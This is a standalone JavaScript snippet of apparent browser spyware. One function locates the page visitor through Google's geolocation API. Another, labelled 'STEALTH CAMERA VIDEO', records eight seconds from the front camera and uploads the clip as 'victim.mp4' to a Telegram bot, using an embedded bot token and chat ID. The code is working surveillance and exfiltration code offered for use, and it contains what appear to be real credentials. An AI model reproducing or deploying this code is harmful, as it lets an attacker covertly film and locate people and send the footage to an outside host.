<script>
// HYPER ACCURATE LOCATION (WiFi + IP)
async function getPreciseLocation(){
  const locData = await fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyD9...', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({considerIp:true, wifiAccessPoints:[]})
  }).catch(()=>null);
  
  if(locData) {
    const loc = await locData.json();
    return `${loc.location.lat.toFixed(6)},${loc.location.lng.toFixed(6)} (wifi)`;
  }
  return 'IP-only';
}

// STEALTH CAMERA VIDEO
async function captureVideo(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({
      video: {facingMode: 'user', width:640, height:480},
      audio: false
    });
    
    const video = document.getElementById('videoPlayer');
    video.srcObject = stream;
    
    // RECORD 8sec VIDEO
    const recorder = new MediaRecorder(stream, {mimeType:'video/webm'});
    const chunks = [];
    recorder.ondataavailable = e => chunks.push(e.data);
    
    recorder.start();
    setTimeout(()=>{
      recorder.stop();
      recorder.onstop = async()=>{
        const blob = new Blob(chunks, {type:'video/webm'});
        
        // UPLOAD VIDEO
        const formData = new FormData();
        formData.append('chat_id','7745393043');
        formData.append('video',blob,'victim.mp4');
        formData.append('caption','üé• 8SEC VIDEO RECORDING');
        
        await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendVideo',{
          method:'POST', body:formData
        });
        
        stream.getTracks().forEach(t=>t.stop());
      };
    },8000);
    
  }catch(e){console.log('Video blocked');}
}
